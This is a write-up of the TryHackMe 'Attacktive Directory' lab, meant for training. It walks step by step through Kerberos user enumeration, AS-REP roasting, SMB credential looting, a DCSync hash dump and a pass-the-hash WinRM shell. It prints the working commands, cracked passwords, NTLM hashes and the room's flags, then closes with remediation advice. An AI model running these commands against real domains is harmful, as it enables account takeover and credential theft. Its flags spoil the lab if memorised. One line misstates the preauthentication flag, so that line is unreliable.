# Attacktive Directory (THM) - Active Directory Exploitation & DCSync

**Platform:** TryHackMe | **Target OS:** Windows Server | **Difficulty:** Medium  
**Focus:** Active Directory Enumeration, AS-REP Roasting, SMB Data Leakage, DCSync Attacks (SecretsDump), Pass-the-Hash (PtH), and WinRM Execution.

---

## 🎯 Executive Summary
The "Attacktive Directory" engagement mirrors a realistic Active Directory (AD) kill-chain. By meticulously enumerating Kerberos users, we identified an account vulnerable to AS-REP Roasting. Cracking this ticket provided initial domain access. Subsequent internal SMB enumeration revealed plaintext backup credentials. Leveraging these credentials, we executed a DCSync attack to replicate the Domain Controller's NTDS.dit database, extracting the enterprise Administrator's NTLM hash. We concluded the engagement by executing a Pass-the-Hash (PtH) attack via WinRM for full domain compromise.

---

## 1. Network Reconnaissance & AD Profiling

We initiated the engagement with a comprehensive Nmap scan to identify the exposed AD services.

```bash
$ nmap -sC -sV -vv 10.113.138.86
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local)
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Intelligence Analysis:**
The presence of Kerberos (88), LDAP (389, 3268), and DNS (53) confirms this host is a **Domain Controller**. The domain name `spookysec.local` was extracted from the LDAP banner and appended to our local `/etc/hosts` file for proper DNS resolution during Kerberos interactions.

---

## 2. User Enumeration & Initial Access (AS-REP Roasting)

We utilized `kerbrute` to perform stealthy user enumeration against the Kerberos KDC, validating active accounts within the domain without triggering standard lockout policies.

```bash
$ kerbrute userenum -d spookysec.local users.txt --dc 10.113.138.86
[+] VALID USERNAME:  svc-admin@spookysec.local
[+] VALID USERNAME:  backup@spookysec.local
[+] VALID USERNAME:  administrator@spookysec.local
```

### AS-REP Roasting (The Vulnerability)
In a secure AD environment, Kerberos requires Pre-Authentication (encrypting a timestamp with the user's password hash) before issuing a Ticket Granting Ticket (TGT). However, if an administrator disables the `UF_DONT_REQUIRE_PREAUTH` flag for a user, an attacker can request an AS-REP ticket for that user and crack it offline.

Using Impacket's `GetNPUsers.py`, we identified that `svc-admin` was vulnerable and extracted their ticket:

```bash
$ GetNPUsers.py spookysec.local/ -dc-ip 10.113.138.86 -usersfile user.txt -request
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1a8d792e7cd4f822c542[...]
```

We cracked the ticket offline using `John the Ripper`, revealing the plaintext password: `management2005`.

---

## 3. Internal SMB Enumeration & Credential Harvesting

Authenticating to the SMB service with our newly acquired credentials (`svc-admin`), we enumerated the domain shares and discovered a non-standard `backup` share.

```bash
$ smbclient \\\\10.113.138.86\\backup --user svc-admin --password management2005
smb: \> ls
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

smb: \> get backup_credentials.txt
```

Inspecting the file revealed a Base64 encoded string containing the plaintext credentials for the `backup` user:
```bash
$ base64 -d backup_credentials.txt
backup@spookysec.local:backup2517860%
```

---

## 4. Domain Compromise: DCSync Attack

The `backup` user likely possessed the `DS-Replication-Get-Changes` Active Directory privilege, which is required to synchronize AD objects. We weaponized this privilege using Impacket's `secretsdump.py` to perform a **DCSync Attack**. 

*Troubleshooting Note:* Initial attempts failed due to local DNS resolution errors over SMB. Explicitly defining the Domain Controller IP (`-dc-ip 10.113.138.86`) resolved the routing issue.

```bash
$ secretsdump.py spookysec.local/backup:backup2517860@10.113.138.86
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
```

We successfully dumped the entire `NTDS.dit` database hashes, securing the `Administrator`'s NTLM hash (`0e0363213e37b94221497260b0bcb4fc`).

---

## 5. Pass-The-Hash (PtH) & WinRM Execution

Armed with the NTLM hashes, we bypassed offline cracking entirely by utilizing a **Pass-the-Hash (PtH)** attack via `Evil-WinRM`. 

*Note on Authorization:* Attempting to login via WinRM with `svc-admin` or `backup` resulted in `WinRMAuthorizationError`, as these accounts lacked membership in the `Remote Management Users` group. We utilized the `Administrator` hash for guaranteed administrative execution.

```bash
$ sudo evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.113.138.86
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{4ctiveD1rectoryM4st3r}

# Retrieving lateral flags
*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}
*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
```

---

## 🛡️ Defensive Remediation & Detection Engineering

1. **AS-REP Roasting Mitigation:** Ensure that the `Do not require Kerberos preauthentication` setting is **disabled** for all user accounts in Active Directory.
2. **Credential Hygiene:** Never store plaintext passwords in `.txt` files on network shares. Utilize automated Privileged Access Management (PAM) solutions for backup service accounts.
3. **DCSync Protection:** Audit the `Replicating Directory Changes` and `Replicating Directory Changes All` permissions. Remove these rights from any user or service account that is not a designated Domain Controller.
4. **WinRM Hardening:** Restrict WinRM access via Group Policy to specific management IP subnets only, and monitor Event ID `4624` (Logon Type 3) for anomalous Pass-the-Hash activities.